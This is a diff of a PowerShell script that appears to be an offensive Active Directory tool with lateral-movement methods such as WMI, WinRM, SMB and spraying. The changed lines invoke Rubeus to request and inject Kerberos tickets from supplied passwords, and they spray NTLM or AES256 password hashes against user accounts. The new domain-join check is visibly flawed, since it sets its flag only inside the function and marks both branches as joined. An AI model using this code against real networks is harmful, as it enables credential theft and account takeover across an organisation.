@@ -104,12 +104,42 @@ $Banner = @("
                                                                  
 
 Github  : https://github.com/The-Viper-One
-Version : 0.4.3
-")
+Version : 0.4.3")
 
 if (!$NoBanner){
 Write-Output $Banner
 }
+
+
+function Test-DomainJoinStatus {
+    try {
+        $computerSystem = Get-WmiObject Win32_ComputerSystem
+        if ($computerSystem.PartOfDomain) {
+            $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetComputerDomain()
+            $domainController = $domain.FindDomainController()
+
+            if ($domainController -ne $null) {
+                $DomainJoined = $True
+            }
+            else {
+                $DomainJoined = $True
+            }
+        }
+        else {
+            $DomainJoined = $False
+        }
+    }
+    catch {
+        Write-Host "An error occurred: $_"
+    }
+}
+
+Test-DomainJoinStatus
+if ($DomainJoined){Write-Output "Domain  : Yes"}
+elseif (!$DomainJoined){Write-Output "Domain  : No"}
+
+
+
 
 # If no targets have been provided
 if (-not $Targets -and $Method -ne "Spray") {
@@ -117,6 +147,7 @@ if (-not $Targets -and $Method -ne "Spray") {
     Write-host "You must provide a value for -targets (all, servers, DCs, Workstations)"
     return
 }
+
 
 
 
@@ -142,7 +173,7 @@ if ($Method -ne "") {
             Write-Host "[*] " -ForegroundColor Yellow -NoNewline
             Write-Host "Invalid Method specified"
             Write-Host "[*] " -ForegroundColor Yellow -NoNewline
-            Write-Host "Specify either: WMI, WinRM, MSSQL, SMB, RDP, VNC, Spray, GenRelayList, SessionHunter, All"
+            Write-Host "Specify either: WMI, WinRM, MSSQL, SMB, RDP, VNC, Spray, GenRelayList, SessionHunter"
             return
         }
     }
@@ -188,10 +219,6 @@ if ($Threads -lt 2){
         return
 }
 
-
-
-$DomainJoined = $True
-try {[System.DirectoryServices.ActiveDirectory.Domain]::GetComputerDomain() | Out-Null } Catch {$DomainJoined = $False}
 
 if (!$DomainJoined){$CurrentUser = $False}
 
@@ -590,6 +617,7 @@ if (!$CurrentUser) {
         } elseif ($UserDomain -eq "") {
             if ($DomainController -ne "") {
                 $AskPassword = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$Domain /password:$Password /dc:$DomainController /opsec /force /ptt"
+                Write-host $AskPassword
             } else {
                 $AskPassword = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$Domain /password:$Password /opsec /force /ptt"
             }
@@ -727,6 +755,10 @@ function Establish-LDAPSession {
         [string]$DomainController  # Optional parameter for domain controller
     )
 
+    if ($DomainController -and -not $DomainController.Contains(".")) {
+        $DomainController = "$DomainController.$Domain"
+    }
+
     # Define LDAP parameters
     $ldapServer = if ($DomainController) { $DomainController } else { $Domain }
     $ldapPort = 389 # Use 636 for LDAPS (SSL)
@@ -750,12 +782,17 @@ function Establish-LDAPSession {
     }
     catch {
         Write-Error "Failed to establish LDAP connection to '$ldapServer'. Error: $_"
+        RestoreTicket
         continue
     }
 }
 
-if ($DomainController -ne ""){Establish-LDAPSession -Domain $Domain -DomainController $DomainController}
-else {Establish-LDAPSession -Domain $Domain}
+if ($DomainController -ne "") {
+    Establish-LDAPSession -Domain $Domain -DomainController $DomainController
+} else {
+    Establish-LDAPSession -Domain $Domain
+}
+
 
 
 function New-Searcher {
@@ -3947,16 +3984,8 @@ $searchResult = $searcher.FindOne()
 }
            # Hash Spraying
             if ($SprayHash -ne ""){
-            if ($SprayHash.Length -eq 32){
-                if ($DomainController -ne ""){$Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /rc4:$SprayHash /domain:$domain /dc:$DomainController" | Out-String}
-                else {$Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /rc4:$SprayHash /domain:$domain" | Out-String}
-            }
-                
-            elseif ($SprayHash.Length -eq 64){
-                if ($DomainController -ne ""){$Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /aes256:$SprayHash /domain:$domain /dc:$DomainController" | Out-String}
-                else {$Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /aes256:$SprayHash /domain:$domain" | Out-String}
-            }
-            
+            if ($SprayHash.Length -eq 32){$Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /rc4:$SprayHash /domain:$domain" | Out-String}
+            elseif ($SprayHash.Length -eq 64){$Attempt = Invoke-Rubeus -Command "asktgt /user:$UserToSpray /aes256:$SprayHash /domain:$domain" | Out-String}
             
             # Check for Unhandled Rubeus exception
             if ($Attempt.IndexOf("Unhandled Rubeus exception:") -ne -1) {
@@ -5671,7 +5700,7 @@ switch ($Method) {
         Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
         Write-Host "Invalid Method specified"
         Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
-        Write-Host "Specify either: WMI, WinRM, MSSQL, SMB, RDP, VNC, Spray, GenRelayList, SessionHunter, All"
+        Write-Host "Specify either: WMI, WinRM, MSSQL, SMB, RDP, VNC, Spray, GenRelayList, SessionHunter"
         return
       
       }
